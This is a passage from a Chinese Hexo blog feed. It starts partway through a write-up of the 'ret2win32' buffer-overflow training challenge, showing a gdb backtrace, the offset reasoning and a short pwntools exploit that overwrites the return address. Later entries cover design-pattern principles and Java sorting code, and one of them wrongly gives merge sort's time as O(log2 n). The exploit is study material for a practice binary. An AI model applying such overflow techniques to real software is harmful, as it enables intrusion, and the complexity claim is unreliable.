buf=&lt;optimized out&gt;, n=0x31, delim=0xa, extract_delim=0x1, eof=0x0)</span><br><span class="line">    at iogetline.c:60</span><br><span class="line">#5  0xf7d6129e in __GI__IO_getline (fp=0xf7ed25c0 &lt;_IO_2_1_stdin_&gt;, </span><br><span class="line">    buf=0xfffb6cd0 &quot;&quot;, n=0x31, delim=0xa, extract_delim=0x1) at iogetline.c:34</span><br><span class="line">#6  0xf7d6004c in _IO_fgets (buf=0xfffb6cd0 &quot;&quot;, n=0x32, </span><br><span class="line">    fp=0xf7ed25c0 &lt;_IO_2_1_stdin_&gt;) at iofgets.c:53</span><br><span class="line">#7  0x08048653 in pwnme ()</span><br><span class="line">#8  0x080485d9 in main ()</span><br><span class="line">#9  0xf7d12e81 in __libc_start_main (main=0x804857b &lt;main&gt;, argc=0x1, </span><br><span class="line">    argv=0xfffb6db4, init=0x8048690 &lt;__libc_csu_init&gt;, </span><br><span class="line">    fini=0x80486f0 &lt;__libc_csu_fini&gt;, rtld_fini=0xf7f079b0 &lt;_dl_fini&gt;, </span><br><span class="line">    stack_end=0xfffb6dac) at ../csu/libc-start.c:310</span><br><span class="line">#10 0x080484a1 in _start ()</span><br></pre></td></tr></table></figure><p>然后gdb，continue一下，脚本pause一下发送数据，看到停在了ret指令处，此时栈顶的内容，存放的是即将返回的地址</p><p><img src="https://user-images.githubusercontent.com/42031559/71447056-29853f80-2765-11ea-9bc5-314b14600169.png" alt="image"></p><p>可以看到栈顶被覆盖成了<code>laaa</code>这4个字节</p><p>我们用<code>ipython</code>计算一下</p><p><img src="https://user-images.githubusercontent.com/42031559/71447089-939de480-2765-11ea-8195-8f8f15559e00.png" alt="image"></p><p>也就是说我们输入44个字符后，接下来的4个字节会被当做函数的返回地址，所以我们将他覆盖成ret2win的地址即可</p></li><li><p>exploit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">'./ret2win32'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r,'b *0x08048658')</span></span><br><span class="line"><span class="comment"># payload = cyclic(100)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">ret2win = <span class="number">0x08048659</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">44</span>+p32(ret2win)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>可以验证一下，下个断点在这里，看到返回地址确实被覆盖成了ret2win的地址</p><p><img src="https://user-images.githubusercontent.com/42031559/71447219-e7f59400-2766-11ea-80d1-616c94a9d59c.png" alt="image"></p></li></ul><h3 id="ret2win-1"><a href="#ret2win-1" class="headerlink" title="ret2win"></a>ret2win</h3><p>与前面一样不过是变成64位的了</p><ul><li></li><li></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;知识&quot;&gt;&lt;a href=&quot;#知识&quot; class=&quot;headerlink&quot; title=&quot;知识&quot;&gt;&lt;/a&gt;知识&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;查看内存分布&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cla
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>security</title>
    <link href="http://yoursite.com/2019/11/13/security/"/>
    <id>http://yoursite.com/2019/11/13/security/</id>
    <published>2019-11-13T12:22:56.000Z</published>
    <updated>2019-11-15T02:00:25.287Z</updated>
    
    <content type="html"><![CDATA[<h2 id="主流的加密方式及其应用"><a href="#主流的加密方式及其应用" class="headerlink" title="主流的加密方式及其应用"></a>主流的加密方式及其应用</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><ul><li>原理：</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;主流的加密方式及其应用&quot;&gt;&lt;a href=&quot;#主流的加密方式及其应用&quot; class=&quot;headerlink&quot; title=&quot;主流的加密方式及其应用&quot;&gt;&lt;/a&gt;主流的加密方式及其应用&lt;/h2&gt;&lt;h3 id=&quot;RSA&quot;&gt;&lt;a href=&quot;#RSA&quot; class=&quot;he
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Design_pattern</title>
    <link href="http://yoursite.com/2019/09/21/Design-pattern/"/>
    <id>http://yoursite.com/2019/09/21/Design-pattern/</id>
    <published>2019-09-21T12:49:47.000Z</published>
    <updated>2019-09-22T09:07:51.800Z</updated>
    
    <content type="html"><![CDATA[<h1 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h1><h2 id="七大原则"><a href="#七大原则" class="headerlink" title="七大原则"></a>七大原则</h2><ul><li><p>单一职责：每个方法、每个类、每个框架只做一件事</p></li><li><p>开闭原则：</p><ol><li>对扩展开放</li><li>对修改关闭</li></ol></li><li><p>接口隔离原则</p><p>类似单一职责，不依赖于它不需要的接口</p></li><li><p>依赖倒置原则</p><p>强调的是针对接口的编程，当下层剧烈变动的时候，上层无感知。</p><ol><li>上层：调用其他方法的</li><li>下层：被其他方法调用的</li><li>上层不能依赖于下层，他们都应该依赖于抽象</li></ol></li><li><p>迪米特法则</p><p>最少知道原则，一个类，对于其他类，要知道的越少越好，只和朋友通信。</p><ol><li>类中的字段是朋友</li><li>方法的参数是朋友</li><li>方法的返回值是朋友</li><li>方法中实例化出来的对象</li></ol></li><li><p>里氏替换原则：</p><ol><li>任何能使用父类对象的地方，都应该能透明的替换为子类对象，也就是说字类对象可以随时地替换父类对象，业务逻辑不变，且不会报错。</li></ol></li><li><p>组合优于继承：</p><ol><li>如果是父类作者，和子类的作者，不是同一个人，就别继承</li><li>如果父类作者和字类作者是同一个人，那就可以继承</li></ol></li><li><p>类与类之间的关系</p><ol><li><p>B继承A：B指向A的实线三角</p></li><li><p>B实现接口A：B指向A的虚线三角</p></li><li><p>B关联A：B里创建A的实例，B指向A的实线箭头</p><p>(1) 组合：关系强，失去A不会破坏B的结构，菱形为空</p><p>(2) 聚合：关系弱，失去A会破坏B的结构，菱形为实心</p></li><li><p>B依赖A：A是B里的局部变量，B-&gt;A的虚线箭头</p></li></ol></li></ul><h2 id="模式"><a href="#模式" class="headerlink" title="模式"></a>模式</h2><ul><li><p>工厂模式</p><p>针对服务器端代码一旦修改，客户端代码也要跟着修改，可以用设计模式，面向接口编程（此处的接口是工厂）。</p><p>简单工厂的优点，把具体产品的类型，从客户端代码中解耦出来；服务器端如果修改了具体产品类名，客户端也知道。</p><p>简单工厂的缺点，客户端不得不死记硬背具体产品的映射关系，如果具体产品特别多，则简单工厂就会变得十分臃肿，最重要的是，变化来了，客户端需要扩展具体产品的时候，势必要更改简单工厂中的代码，解耦是对已有的产品解耦。</p><ol><li>产品：类的实例</li><li>抽象产品：抽象类、接口</li></ol></li><li><p>工厂方法</p><p>当需要扩展时，简单工厂模式需要修改代码，而工厂方法是扩展一个产品的时候也扩展扩展方法</p><ol><li>优点：仍然具有简单工厂的优点：服务器修改了具体产品的类名后，客户端不知道</li><li>当客户端需要扩展一个新产品时，不需要修改作者原来的代码，只是扩展一个新的工厂而已</li></ol></li><li><p>是</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;设计模式&quot;&gt;&lt;a href=&quot;#设计模式&quot; class=&quot;headerlink&quot; title=&quot;设计模式&quot;&gt;&lt;/a&gt;设计模式&lt;/h1&gt;&lt;h2 id=&quot;七大原则&quot;&gt;&lt;a href=&quot;#七大原则&quot; class=&quot;headerlink&quot; title=&quot;七大原则&quot;&gt;&lt;/a
      
    
    </summary>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
      <category term="设计模式" scheme="http://yoursite.com/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>Algorithm</title>
    <link href="http://yoursite.com/2019/09/14/Algorithm/"/>
    <id>http://yoursite.com/2019/09/14/Algorithm/</id>
    <published>2019-09-14T05:14:18.000Z</published>
    <updated>2019-11-09T13:40:46.849Z</updated>
    
    <content type="html"><![CDATA[<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul><li>交换方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//交换方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> index1,<span class="keyword">int</span> index2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = a[index1];</span><br><span class="line">        a[index1] = a[index2];</span><br><span class="line">        a[index2] = tmp;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>排序对数器</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//排序对数器</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rightMethod</span><span class="params">(<span class="keyword">int</span> a[])</span></span>&#123;</span><br><span class="line">        Arrays.sort(a);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>生成随机数组</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//生成随机数组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] generateRandomArray(<span class="keyword">int</span> maxSize, <span class="keyword">int</span> maxValue) &#123;</span><br><span class="line">        <span class="comment">//生成一个数组，长度是随机的</span></span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[(<span class="keyword">int</span>) ((maxSize + <span class="number">1</span>) * Math.random())];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="comment">//每一个数是随机的</span></span><br><span class="line">            arr[i] = (<span class="keyword">int</span>) ((maxValue + <span class="number">1</span>) * Math.random()) - (<span class="keyword">int</span>) (maxValue * Math.random());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>数组拷贝</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数组拷贝</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[]copyArray(<span class="keyword">int</span>[]arr)&#123;</span><br><span class="line">        <span class="keyword">if</span> (arr==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">int</span>[]res = <span class="keyword">new</span> <span class="keyword">int</span>[arr.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">            res[i]=arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>数组判断相等</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数组判断相等</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isEqual</span><span class="params">(<span class="keyword">int</span>[] arr1, <span class="keyword">int</span>[] arr2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((arr1 == <span class="keyword">null</span> &amp;&amp; arr2 != <span class="keyword">null</span>) || (arr1 != <span class="keyword">null</span> &amp;&amp; arr2 == <span class="keyword">null</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (arr1 == <span class="keyword">null</span> &amp;&amp; arr2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (arr1.length != arr2.length) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr1.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr1[i] != arr2[i]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>打印数组</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打印数组</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (arr == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            System.out.print(arr[i] + <span class="string">" "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><ul><li><p>冒泡排序</p><ol><li>原理：从第一个位置开始，比较这一个位置和下一个位置数的大小，如果这一个位置数更大，就和下个位置的数交换，一轮下来保证n个数中最大的数到大最后，下一轮完成后剩下的n-1个数中最大的数到达倒数第二个位置。</li><li>代码：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//冒泡排序</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span> a[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (a==<span class="keyword">null</span>||a.length&lt;<span class="number">2</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//最外层表示这一轮要确定第几个位置的数</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> end=a.length-<span class="number">1</span>;end&gt;<span class="number">0</span>;end--)&#123;</span><br><span class="line">            <span class="comment">//内层循环依次比较并交换相邻位置的数</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;end;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (a[i]&gt;a[i+<span class="number">1</span>])&#123;</span><br><span class="line">                    Tool.swap(a,i,i+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>时间复杂度：O(n^2^)</li><li>空间复杂度：O(1)</li></ol></li><li><p>选择排序</p><ol><li>原理：每次遍历找出剩下的数中最小的数放在对应位置，每次遍历的时候前i个数有序</li><li>代码：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">selectionSort</span><span class="params">(<span class="keyword">int</span> arr[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (arr==<span class="keyword">null</span>||arr.length&lt;<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//外层循环从第1个位置到第n-1个位置</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> minIndex = i;</span><br><span class="line">            <span class="comment">//内层循环从第2个位置到第n个位置</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j =i+<span class="number">1</span>;j&lt;arr.length;j++)&#123;</span><br><span class="line">                <span class="comment">//满足条件，记录下标</span></span><br><span class="line">                <span class="keyword">if</span> (arr[j]&lt;arr[minIndex])&#123;</span><br><span class="line">                   minIndex = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//内层结束，交换</span></span><br><span class="line">            Tool.swap(arr,i,minIndex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>时间复杂度：O(n^2^)</li><li>空间复杂度：O(1)</li></ol></li><li><p>插入排序</p><ol><li>原理：从第<code>i</code>个数开始遍历将更小的数插入前面的有序数组中</li><li>代码：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insertSort</span><span class="params">(<span class="keyword">int</span> arr[])</span></span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (arr==<span class="keyword">null</span>||arr.length&lt;<span class="number">2</span>) <span class="keyword">return</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">int</span> j=i-<span class="number">1</span>;j&gt;=<span class="number">0</span>;j--)&#123;</span><br><span class="line">               <span class="keyword">if</span> (arr[j]&gt;arr[j+<span class="number">1</span>]) Tool.swap(arr,j,j+<span class="number">1</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>时间复杂度：O(n^2^)</li><li>空间复杂度：O(1)</li></ol></li><li><p>归并排序</p><ol><li>原理：分为递归和合并两个部分，递归是为了将大数组分解为两个小数组，合并就是排序的过程</li><li>代码：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mergeSort</span><span class="params">(<span class="keyword">int</span> arr[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (arr==<span class="keyword">null</span>||arr.length&lt;<span class="number">2</span>) <span class="keyword">return</span>;</span><br><span class="line">        sort(arr,<span class="number">0</span>,arr.length-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//归并排序</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l==r) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//切一半</span></span><br><span class="line">        <span class="keyword">int</span> mid = l + ((r-l)&gt;&gt;<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//左边递归</span></span><br><span class="line">        sort(arr,l,mid);</span><br><span class="line">        <span class="comment">//右边递归</span></span><br><span class="line">        sort(arr,mid+<span class="number">1</span>,r);</span><br><span class="line">        <span class="comment">//合并</span></span><br><span class="line">        merge(arr,l,r,mid);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//合并</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> mid)</span></span>&#123;</span><br><span class="line">        <span class="comment">//定义一个新的数组，数组长度和这一轮递归的l和r有关</span></span><br><span class="line">        <span class="keyword">int</span> []res = <span class="keyword">new</span> <span class="keyword">int</span>[r-l+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> p1 = l;</span><br><span class="line">        <span class="keyword">int</span> p2 = mid+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//排序、移动下标</span></span><br><span class="line">        <span class="keyword">while</span>(p1 &lt;= mid &amp;&amp; p2 &lt;= r)&#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[p1]&lt;arr[p2])&#123;</span><br><span class="line">                res[i++] = arr[p1++];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                res[i++] = arr[p2++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//当其中一边先移动完成，另一边直接复制，因为是有序的</span></span><br><span class="line">        <span class="keyword">while</span> (p1&lt;=mid)&#123;</span><br><span class="line">            res[i++] = arr[p1++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (p2&lt;=r)&#123;</span><br><span class="line">            res[i++] = arr[p2++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//因为传递的是引用，所以直接在这里改动原来的数组，以l作为起始位置即可。</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j =<span class="number">0</span>;j&lt;res.length;j++)&#123;</span><br><span class="line">            arr[l+j] = res[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>时间复杂度：O(log<del>2</del>n)，用master公式计算</li><li>空间复杂度：O(n)，数据有多少就要多少额外空间装</li></ol></li><li><p>归并排序的应用：求一组数每个数左边的比它小的数的总和</p><ol><li>原理：每次合并的同时会进行比较，此时就可以记下最小和并返回。注意这里产生最小和的细节是，将题目转化为，只要右边有一个数比自己大，那么最小和的值就加上自己本身</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SmallSum</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">smallSum</span><span class="params">(<span class="keyword">int</span> arr[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (arr == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> recursive(arr,<span class="number">0</span>,arr.length-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">recursive</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l==r) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> mid = l + ((r-l) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">            <span class="comment">//左边递归会产生最小和,右边递归会产生最小和,此次合并会产生最小和</span></span><br><span class="line">            recursive(arr,l,mid)+recursive(arr,mid+<span class="number">1</span>,r)+merge(arr,l,r,mid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> mid)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> p1 = l;</span><br><span class="line">        <span class="keyword">int</span> p2 = mid+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span>[]tmp = <span class="keyword">new</span> <span class="keyword">int</span>[r-l+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">while</span>(p1 &lt;= mid &amp;&amp; p2 &lt;= r)&#123;</span><br><span class="line">           res += arr[p1] &lt; arr[p2]?arr[p1]*(r-p2+<span class="number">1</span>):<span class="number">0</span>;</span><br><span class="line">           tmp[i++] = arr[p1] &lt; arr[p2]?arr[p1++]:arr[p2++];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(p1 &lt;= mid)&#123;</span><br><span class="line">            tmp[i++] = arr[p1++];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(p2 &lt;= r)&#123;</span><br><span class="line">            tmp[i++] = arr[p2++];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;tmp.length;i++)&#123;</span><br><span class="line">            arr[l+i] = tmp[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] 